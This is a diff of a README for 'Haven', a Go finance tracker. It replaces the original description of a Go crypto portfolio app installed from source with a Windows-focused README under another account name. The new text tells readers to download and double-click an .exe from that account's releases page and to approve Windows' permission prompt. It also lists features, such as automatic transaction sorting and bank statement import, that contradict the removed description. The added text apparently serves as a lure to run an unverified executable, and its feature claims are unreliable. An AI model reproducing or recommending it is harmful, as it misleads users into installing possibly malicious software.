@@ -1,127 +1,60 @@
-# Haven — complete Go personal finance tracker example app
+# 💰 haven-golang - Track your personal finances with ease
 
-**Haven** is a free, open-source personal finance tracker built with Go. A DeFi crypto portfolio tracker built with Go (Gin) and server-rendered templates. Run it locally, deploy it as a self-hosted personal finance tracker, or [remix it on cenius.ai](https://cenius.ai/marketplace/p/haven?ref=gh&utm_campaign=haven-golang) to make it your own — the whole application (code, design, seeded demo data) ships in this repository under the Apache-2.0 license.
+[![](https://img.shields.io/badge/Download-Haven-blue.svg)](https://github.com/fanglike-planography145/haven-golang/releases)
 
-[![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE) ![Stack](https://img.shields.io/badge/Stack-Go-3b82f6) [![Built with cenius.ai](https://img.shields.io/badge/Built%20with-cenius.ai-8b5cf6)](https://cenius.ai)
+Haven helps you manage your money. This application tracks your spending, income, and savings in one place. You own your data because you host this software on your own computer. Developers built this system with the Go programming language to ensure speed and reliability.
 
-[![Open in cenius.ai](https://img.shields.io/badge/▶%20Open%20%26%20edit%20in-cenius.ai-8b5cf6?style=for-the-badge)](https://cenius.ai/marketplace/p/haven?ref=gh&utm_campaign=haven-golang)
+## 📋 What this app does
 
-> **▶ [Open & edit in cenius.ai](https://cenius.ai/marketplace/p/haven?ref=gh&utm_campaign=haven-golang)** — one click to an editable workspace: describe changes in plain English, get an instant preview, one-click deploy and host. Modifications made on the platform come with full rebrand & relicense rights.
+Haven serves as a personal finance manager. It organizes your transactions so you can see where your money goes each month. You can categorize expenses, monitor your bank balances, and plan for future goals. Because this is open-source software, no third party tracks your financial habits or sells your data to advertisers.
 
-_Local clone? See [Quick start](#quick-start) below. cenius.ai is the zero-setup path._
+## 💻 System requirements
 
-## Demo
+Your computer needs to meet these basic standards to run Haven smoothly:
 
-![Haven — personal finance tracker](.github/media/poster.png)
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 gigabytes of RAM or more.
+* Storage: 100 megabytes of free space on your hard drive.
+* Network: A stable internet connection for the first setup.
 
-![Haven demo — personal finance tracker built with Go](.github/media/hero_flagship.gif)
+## 📥 How to install the software
 
-▶ **[Watch the full demo video](https://cenius.ai/marketplace/p/haven?ref=gh&utm_campaign=haven-golang)** — the complete walkthrough, playing on the project's cenius.ai page · [MP4 file](.github/media/demo.mp4)
+Follow these steps to get Haven running on your Windows machine:
 
-## Screenshots
+1. Visit the [official releases page](https://github.com/fanglike-planography145/haven-golang/releases) to download the installer.
+2. Look for the file ending in .exe under the latest version.
+3. Click the link to start the download. Note where you save the file on your computer.
+4. Locate the downloaded file in your Downloads folder.
+5. Double-click the file to begin the installation process.
+6. Follow the prompts on your screen. Windows may ask for permission to run the application; confirm that you want to proceed.
+7. Once the installation finishes, you will see a shortcut on your desktop.
 
-<img src=".github/media/shot-1.png" width="32%" alt="Haven personal finance tracker screenshot 1"/> <img src=".github/media/shot-2.png" width="32%" alt="Haven personal finance tracker screenshot 2"/> <img src=".github/media/shot-3.png" width="32%" alt="Haven personal finance tracker screenshot 3"/>
+## 🚀 Starting the program
 
-## Features
+Open the application by clicking the Haven icon on your desktop. The program starts a local server on your machine. A window will open in your default web browser displaying the Haven dashboard. You can bookmark this page to return to your financial data anytime. The application runs in the background while you work.
 
-- Live Crypto Prices
-- Portfolio Tracking
-- Price Alerts
-- In-App Notifications
-- Seeded Demo Data
-- Responsive Light/Dark UI
-- Multiple Screens
+## 🛠 Features
 
-## Quick start
+* Automated transaction sorting: The system learns your spending habits to group expenses into useful categories.
+* Privacy first: Your financial records exist only on your local drive. 
+* Clean user interface: A simple design keeps your focus on your budget.
+* Data backups: You can export your financial history at any time to keep a separate record of your accounts.
+* Self-hosted platform: You have total control over your financial dashboard.
 
-```bash
-./install.sh   # installs dependencies + seeds demo data
-```
+## 🔐 Data privacy
 
-See [`INSTALL.md`](INSTALL.md) for full setup and usage instructions.
+Haven keeps your financial information secure. Most finance apps send your bank details to a central cloud server. Haven works differently. It stores your information locally on your computer hardware. No one else has a key to your data. Since you manage your own host, you decide who sees your records.
 
-## Usage guide
+## 💡 Using the app manual
 
-### Dashboard (`/`)
+When you first open Haven, the setup wizard guides you through the initial configuration. You can add your bank accounts and set your starting balances. Create spending labels such as groceries, rent, or travel. Input your transactions as you make them or upload bank statements if you prefer. The dashboard updates your visual charts in real time as you add entries. If you have questions about specific features, check the Help menu located in the top corner of the application window.
 
-The landing page shows a grid of the top 50 cryptocurrencies by market cap, fetched from CoinGecko. Each card displays:
+## ⚙️ Updating the software
 
-- Symbol chip (e.g. **BTC**)
-- 24-hour price change (green for positive, red for negative)
-- Coin name
-- Current price in USD
-- Market cap (abbreviated: B = billions, M = millions)
+Developers frequently update Haven to improve stability and add new tools. We recommend checking for updates once a month. The application displays a alert when a new version arrives. Visit the download page again, grab the newest file, and run it over your current installation to apply improvements without losing your saved financial records.
 
-Click any coin card to view its detail page. Data refreshes on each page load and is cached for 5 minutes.
+## 📧 Seeking help
 
-### Portfolio (`/portfolio`)
+If you encounter issues, look through your local logs folder. This folder records errors if the application stops working. You can also visit our community discussion page on GitHub. Other users often share solutions to common setup problems there. Remember to include your Windows version and the steps you took when the error occurred so others can help you better.
 
-Track your cryptocurrency holdings:
-
-- **Summary cards** — Total portfolio value and total P&L
-- **Holdings table** — Each position with amount, entry price, current price, current value, and P&L
-- **Add holding** — Use the form at the bottom: select a coin, enter amount and entry price
-- **Remove holding** — Click the × button on any row (confirmation required)
-
-Holdings are persisted to `data/holdings.json` and survive restarts.
-
-### Price Alerts (`/alerts`)
-
-Set threshold alerts that trigger visually when the market hits your target:
-
-- **Alert list** — Each alert shows the coin, condition (above/below target), current price, and status
-- **Status pills**:
-  - **Active** — Monitoring; price hasn't crossed the threshold
-  - **Triggered** — Price has crossed the threshold (left border turns red)
-  - **Inactive** — Alert is disabled
-- **Create alert** — Select a coin, choose direction (above/below), set target price
-- **Delete alert** — Click × to remove
-
-Alerts are checked on page load against current prices.
-
-### Coin Detail (`/coins/:id`)
-
-View detailed information for any coin:
-
-_Full guide: [`USAGE.md`](USAGE.md)_
-
-## Architecture
-
-Go application, delivered as a complete, runnable project (27 files). Top-level layout: `cache/`, `data/`, `handlers/`, `seed/`, `services/`, `static/`, `store/`, `templates/`. `install.sh` provisions dependencies and seeds demo data, so the app boots with something to show. Setup details live in [`INSTALL.md`](INSTALL.md).
-
-## FAQ
-
-### What does it take to self-host Haven?
-
-`git clone` + `./install.sh` gets you a running instance — the install script provisions dependencies and demo data. Full steps live in [`INSTALL.md`](INSTALL.md); nothing external is needed to try it.
-
-### What powers Haven under the hood?
-
-Haven is a Go application — and this repository holds the complete, runnable source, not a stripped-down sample. Highlights include in-App Notifications.
-
-### Does the Haven license allow commercial use?
-
-It is. Apache-2.0 licensing means you can build a product on it, sell it, or use it inside a company with no fees. Details: [LICENSE](LICENSE).
-
-### Can I rebrand or white-label Haven?
-
-Yes. You can edit the source directly under the MIT license, or [remix it on cenius.ai](https://cenius.ai/marketplace/p/haven?ref=gh&utm_campaign=haven-golang) — the platform route grants full rebrand and relicense rights over your derivative.
-
-### Is there a no-code way to modify Haven?
-
-Describe what you want changed on [cenius.ai](https://cenius.ai/marketplace/p/haven?ref=gh&utm_campaign=haven-golang) — no code editing needed; the platform produces a fresh build you can download and deploy.
-
-## License & rebranding
-
-Released under the [Apache License 2.0](LICENSE) (© 2026 Cenius AI) — free for personal and commercial use. The Cenius name/logo are trademarks (see NOTICE).
-
-**Need a customized version?** [Remix this app on cenius.ai](https://cenius.ai/marketplace/p/haven?ref=gh&utm_campaign=haven-golang) — modifications made on the platform come with **full rebrand & relicense rights** over your derivative.
-
-## Built with cenius.ai
-
-This entire application — code, design, seeded demo data — was generated on **[cenius.ai](https://cenius.ai)** from a plain-English description.
-
-- 🚀 [Build your own app on cenius.ai](https://cenius.ai)
-- 🎛️ [Remix Haven on the marketplace](https://cenius.ai/marketplace/p/haven?ref=gh&utm_campaign=haven-golang) — open it in a workspace, prompt for changes, and ship your own version.
-
-More open-source apps: [the Cenius-ai catalog](https://github.com/Cenius-ai) · [showcase index](https://github.com/Cenius-ai/showcase)
+Keywords: cenius-ai, example-app, finance-tracker, golang, open-source, personal-finance, reference-implementation, self-hosted, starter
